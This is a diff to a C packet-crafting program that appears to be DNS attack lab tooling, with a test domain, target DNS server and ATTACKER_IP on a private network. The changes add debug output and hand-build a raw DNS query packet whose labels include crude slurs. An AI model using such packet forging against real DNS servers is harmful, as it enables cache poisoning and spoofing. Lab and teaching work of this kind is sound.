@@ -1,5 +1,5 @@
 /*		    GNU GENERAL PUBLIC LICENSE
-		       Version 2, June 1991
+		    Version 2, June 1991
 
  Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
@@ -15,6 +15,7 @@
 #include <stdlib.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include "pacgen.h"
 
 
     int c;
@@ -44,7 +45,7 @@
 
 #define domain  "dnsArmorTest.com"
 
-#define MY_PORT "eth14"
+#define MY_PORT "eth11"
 #define CLIENT_IP "192.168.0.38"
 #define TARGET_DNS_SERVER_IP "192.168.0.44"
 #define ATTACKER_IP "192.168.0.43"
@@ -166,18 +167,26 @@ main(int argc, char *argv[])
 
 	/* Generate random number using rand function and generate randomized prefix */
 	int prefix = rand() % 1000000;
+	
+	printf("allocate memory for sub domain\n");
 
 	/* more Randomize */
 	while(prefix < 99999) {
 		prefix *= 52;
 	}
+
+	printf("prefix %d\n",prefix);	
+
 	sub_domain = (char *) malloc (128);
 	if(!sub_domain) {
 		printf("\nFailed to allocate memory\n");
 		exit(1);
 	}
+	printf("generate sub domain\n");
 	sprintf(sub_domain, "ypatil%d.", prefix);
-	strcat(sub_domain, domain);
+	printf("comcatenate sub domain\n");
+	printf("s len %d d len %d\n",strlen(sub_domain),strlen(domain));
+//	strcat(sub_domain, "crapbag.com");
 	printf("\n Here %s", sub_domain);
 
 	
@@ -328,7 +337,7 @@ load_payload()
 {
     FILE *infile;
     struct stat statbuf;
-    int i = 0;
+    int i = 12,k,l,m;
     int c = 0;
 
     /* get the file size so we can figure out how much memory to allocate */
@@ -348,17 +357,125 @@ load_payload()
     infile = fopen(payload_file, "r");	/* open the payload file read only */
     
     payload_location[0] = 0x20; payload_location[1] = 0x20;
-    payload_location[2] = 0x01; payload_location[3] = 0x00;
+    payload_location[2] = 0x81; payload_location[3] = 0x00;
     payload_location[4] = 0x00; payload_location[5] = 0x01;
     payload_location[6] = 0x00; payload_location[7] = 0x00;
     payload_location[8] = 0x00; payload_location[9] = 0x00;
     payload_location[10] = 0x00; payload_location[11] = 0x00;
    
     payload_filesize += DNS_HEADER_LEN;
-    payload_location[12] = 0x03;
+   // payload_location[12] = 0x03;
     payload_filesize ++;
+//int i=0;
+	printf("payload ");
+	for(l=0;l<i;l++){
+	printf("%X ",payload_location[l]);
+	}
+	printf("\n");
 
-    i = 1;
+	char nprefix[] = "www";
+	char name[] = "gandu";
+	char ndomain[] = "chodu";
+
+	/*unsigned char l_prefix[10];
+	unsigned char l_name[10];
+	unsigned char l_domain[10];
+	
+	sprintf(l_prefix, "%d", strlen(nprefix));	
+	sprintf(l_name, "%d", strlen(name));	
+	sprintf(l_domain, "%d", strlen(ndomain));	
+
+	printf("prefix %s\n",l_prefix);
+	printf("name %s\n",l_name);  
+	printf("domain %s\n",l_domain); 
+	char l_p[1];
+	char l_n[1];
+	char l_d[1];
+
+	
+	sprintf(l_p,"%d",strlen(nprefix));
+	sprintf(l_n,"%d",strlen(name));  
+	sprintf(l_d,"%d",strlen(ndomain)); 
+
+	printf("prefix %X\n",l_p[0]);
+	printf("name %X\n",l_n[0]);  
+	printf("domain %X\n",l_d[0]);
+ */
+
+	unsigned int l_p = strlen(nprefix);
+	unsigned int l_n = strlen(name);
+	unsigned int l_d = strlen(ndomain);
+
+	i=12;
+	
+	payload_location[i] = l_p;
+	i++;
+	
+	printf("payload ");
+	for(l=0;l<i;l++){
+	printf("%X ",payload_location[l]);
+	}
+	printf("\n");
+	
+	for(k =0;k<strlen(nprefix);k++){
+		printf("i %d k%d\n",i,k);
+		payload_location[i] = nprefix[k];
+		i++;
+	}
+	
+	printf("payload ");
+	for(l=0;l<i;l++){
+	printf("%X ",payload_location[l]);
+	}
+	printf("\n");
+	
+	payload_location[i] = l_n;
+	i++;
+
+	
+	printf("payload ");
+	for(l=0;l<i;l++){
+	printf("%X ",payload_location[l]);
+	}
+	printf("\n");
+	
+	for(l =0;l<strlen(name);l++){
+		payload_location[i] = name[l];
+		i++;
+	}
+
+	printf("payload ");
+	for(l=0;l<i;l++){
+	printf("%X ",payload_location[l]);
+	}
+	printf("\n");
+
+	payload_location[i] = l_d;
+	i++;
+	
+
+	printf("payload ");
+	for(l=0;l<i;l++){
+	printf("%X ",payload_location[l]);
+	}
+	printf("\n");
+
+	for(m =0;m<strlen(ndomain);m++){
+		payload_location[i] = ndomain[m];
+		i++;
+	}
+	
+	payload_location[i] = 0x00;i++; 
+	payload_location[i] = 0x00;i++; payload_location[i] = 0x01;i++;
+	payload_location[i] = 0x00;i++; payload_location[i] = 0x01;i++;
+
+	printf("payload ");
+	for(l=0;l<i;l++){
+	printf("%X ",payload_location[l]);
+	}
+	printf("\n");
+
+/*    i = 1;
     int j = 0;
     int len = strlen(sub_domain);
     while(j<len) {
@@ -366,8 +483,8 @@ load_payload()
 	i++;
 	j++;
     }
-    payload_filesize +=j;
-    printf("\n Payload %s \n %s\n Len: %d", payload_location, (payload_location + DNS_HEADER_LEN), payload_filesize);
+    payload_filesize +=j;*/
+    //printf("\n Payload %s \n %s\n Len: %d", payload_location, (payload_location + DNS_HEADER_LEN), payload_filesize);
 	fflush(stdout);
     fclose(infile);
 }
@@ -434,6 +551,8 @@ load_tcp_udp()
 
     fclose(infile); /*close the file*/
 }
+
+
 
     /* load_ip: load IP data file into memory */
 load_ip()
